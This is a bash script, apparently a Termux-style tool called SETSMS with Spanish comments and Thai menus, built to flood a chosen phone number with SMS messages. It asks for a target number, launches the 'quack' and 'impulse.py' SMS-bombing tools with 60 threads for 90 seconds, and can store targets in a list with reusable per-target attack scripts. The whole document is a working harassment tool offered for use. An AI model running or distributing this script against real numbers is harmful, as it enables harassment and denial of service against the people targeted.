#!/bin/bash
#
# target: (26/01/2021)
#
# [Open Source] - [Código Abierto]
#
# Variables y Colores
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Mensaje de Opción Incorrecta
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡ทางเลือกที่ผิด!     ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner SETSMS
#
function SETSMS {
  sleep 0.5
  clear
echo -e "${verde}
███████╗███████╗████████╗███████╗███╗   ███╗███████╗
██╔════╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██╔════╝
███████╗█████╗     ██║   ███████╗██╔████╔██║███████╗
╚════██║██╔══╝     ██║   ╚════██║██║╚██╔╝██║╚════██║
███████║███████╗   ██║   ███████║██║ ╚═╝ ██║███████║
╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚══════╝"${blanco}
}
#
# Solicitando Número Telefónico
#
function PhoneNumber {
SETSMS
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}   ป้อนหมายเลขเป้าหมาย       ${verde}█
└════════════════════════════┘
┃     ┌═══════════════════┐
└═>>>█ ${blanco}สคริปแปลไทย  ${verde}█
       └═══════════════════┘
┃    ┌═════════┐  ┌═══════════════┐
└═>>>█ ${blanco}ตัวอย่าง ${verde}█=>█ ${azul}+66398148077 ${verde}█
┃    └═════════┘  └═══════════════┘
┃    ┌════════════════════════════════════════┐
└═>>>█ ${rojo}อย่าลืมป้อนหมายเลขทั้งหมดด้วยกัน                     ${verde}█
┃    └════════════════════════════════════════┘
┃
└═>>> "${amarillo}
read -r PHONE
sleep 0.5

echo -e "${verde}
           ┌═════════════════┐
           █ ${azul}บันทึกจำนวนแล้ว ${verde}█
           └═════════════════┘
   ┌═════════════════════════════════┐
   █ ${blanco}SI YÁ USÓ ÉSTA HERRAMIENTA EN   ${verde}█
   █ ${blanco}UN NÚMERO TELEFÓNICO, TIENE QUE ${verde}█
   █ ${blanco}ESPERAR 24 HORAS PARA USARLA    ${verde}█
   █ ${blanco}NUEVAMENTE EN EL MISMO NÚMERO,  ${verde}█
   █ ${blanco}DE LO CONTRARIO, PUEDE QUE LA   ${verde}█
   █ ${blanco}HERRAMIENTA NO RESPONDA CON LA  ${verde}█
   █ ${blanco}MISMA CANTIDAD DE MENSAJES QUE  ${verde}█
   █ ${blanco}ENVIÓ EN LA PRIMERA VEZ...      ${verde}█
   └═════════════════════════════════┘
 ┌══════════════════════════════════════┐
 █ ${rojo}SMS สแปมสามารถอยู่ได้ตั้งแต่ 2 ถึง 3         ${verde}█
 █ ${rojo}อย่างไรก็ตาม คุณสามารถยกเลิกได้ภายในไม่กี่นาที  ${verde}█
 █ ${rojo}กระบวนการและการจัดส่งของพวกเขา           ${verde}█
 █ ${rojo}ด้วยการผสมผสานที่สำคัญ ...               ${verde}█
 └══════════════════════════════════════┘
            ┌══════┐   ┌═══┐
            █ ${azul}CTRL ${verde}█ + █ ${azul}C ${verde}█
            └══════┘   └═══┘
┌═════════════════════════════════════════┐
█ ${blanco}กด Enter เพื่อเริ่ม SMS SPAM                       ${verde}█
└═════════════════════════════════════════┘
"${blanco}
read
}
#
# Llamando a las Herramientas Quack e Impulse
#
function SendSMS {
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}
}
function Backup {
SETSMS
echo -e -n "${verde}
┌════════════════════════════════════┐
█ ${blanco}บันทึกหมายเลขในบัญชีดำ?                   ${verde}█
└════════════════════════════════════┘
┃
└═>>> ┃${azul} ${PHONE} ${verde}┃
┃
┃    ┌═══════════════════┐
└═>>>█ [${blanco}01${verde}] ┃ ${blanco}ใช่ บันทึก ${verde}█
┃    └═══════════════════┘
┃    ┌═══════════════════┐
└═>>>█ [${blanco}02${verde}] ┃ ${blanco}ไม่ บันทึก ${verde}█
┃    └═══════════════════┘
┃
└═>>> "${blanco}
read -r SCRIPT
sleep 0.5

if [[ ${SCRIPT} == 1 || ${SCRIPT} == 01 ]]; then
echo -e -n "${verde}
┌══════════════════════════════════┐
█ ${blanco}ป้อนชื่อสำหรับหมายเลขของคุณ             ${verde}█
└══════════════════════════════════┘
┃    ┌═════════┐  ┌═════════┐
└═>>>█ ${blanco}ตัวอย่าง ${verde}█=>█ ${azul}Darkmux ${verde}█
┃    └═════════┘  └═════════┘
┃
└═>>> "${amarillo}
read -r NAME
sleep 0.5
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/list.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/list.sh
echo -e 'echo -e "${blanco}${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/list.sh
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/spam.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/spam.sh
echo -e 'echo -e "${verde}
┌══════════┐
█ ${blanco}วัตถุประสงค์${verde}█
└══════════┘
${blanco}
${NAME} ${verde}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/spam.sh
echo -e "source ${RUTA}/numbers/${NAME}.sh" >> ${RUTA}/tools/spam.sh
echo -e "#!/bin/bash
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}" >> ${RUTA}/numbers/${NAME}.sh
echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}จำนวนที่บันทึกไว้ในสคริปต์          ${verde}█
└══════════════════════════════┘
┃
└═>>>${amarillo} ${RUTA}/numbers/${NAME}.sh"${blanco}
elif [[ ${SCRIPT} == 2 || ${SCRIPT} == 02 ]]; then
exit
else
Error
Backup
fi
}
#
# Regresando al Menu Principal
#
function Restart {
echo -e "${verde}
┌════════════════════════════┐
█ ${blanco}กด Enter เพื่อดำเนินการต่อ     ${verde}█
└════════════════════════════┘"${blanco}
read
source ${RUTA}/SETSMS.sh
}
#
# Declarando Funciones
#
PhoneNumber
SendSMS
Backup
Restart
